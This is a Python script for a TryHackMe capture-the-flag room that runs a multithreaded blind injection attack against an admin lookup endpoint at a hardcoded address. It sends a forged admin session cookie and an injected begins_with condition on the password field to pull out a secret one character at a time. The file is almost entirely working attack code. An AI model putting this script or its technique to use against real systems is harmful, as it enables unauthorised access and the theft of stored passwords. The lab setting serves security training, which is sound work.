# On TryHackMe Attackbox use python3.9 blind_sql.py
# script by Gemini Pro
# tryhackme room Cloud Nine https://tryhackme.com/room/lafbctf2026-advanced
# Youtube video walk through: https://youtu.be/nhOOzwlJ91M

import requests
import string
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

# --- CONFIGURATION ---
URL = "http://54.205.77.77:8080/admin"
SESSION_COOKIE = "eyJhZG1pbiI6dHJ1ZSwidXNlciI6ImFkbWluIn0.aZVvAg.6w63Sco9Mci-_SZXEPQXcLbuQLU" # Put your forged admin cookie here

# Ordered by probability: lowercase, digits, uppercase, symbols
charset = string.ascii_lowercase + string.digits + string.ascii_uppercase + "_-}" 

# Use a Session to keep the TCP connection alive (Massive speed boost)
session = requests.Session()
session.headers.update({"Cookie": f"session={SESSION_COOKIE}"})

flag = "THM{"
print(f"[*] Starting FAST Blind SQLi extraction...")
print(f"[*] Current Flag: {flag}")

def test_character(char, current_flag):
    """Function to be run by each thread."""
    test_string = current_flag + char
    payload = f"nobody' OR begins_with(\"password\", '{test_string}') OR username = 'nobody"
    
    data = {
        "action": "lookup",
        "username": payload
    }
    
    response = session.post(URL, data=data)
    if "User loaded." in response.text:
        return char
    return None

while True:
    found_char = None
    
    # Launch 15 threads to check characters concurrently
    with ThreadPoolExecutor(max_workers=15) as executor:
        # Map futures to characters
        futures = {executor.submit(test_character, char, flag): char for char in charset}
        
        for future in as_completed(futures):
            result = future.result()
            if result:
                found_char = result
                # We found the character, cancel remaining threads for this position
                executor.shutdown(wait=False, cancel_futures=True)
                break
                
    if found_char:
        flag += found_char
        print(f"[+] Found character! Current Flag: {flag}")
        
        if found_char == "}":
            print(f"\n[!] Extraction Complete! Flag: {flag}")
            sys.exit(0)
    else:
        print("\n[-] Could not find the next character. Is the session cookie still valid?")
        break
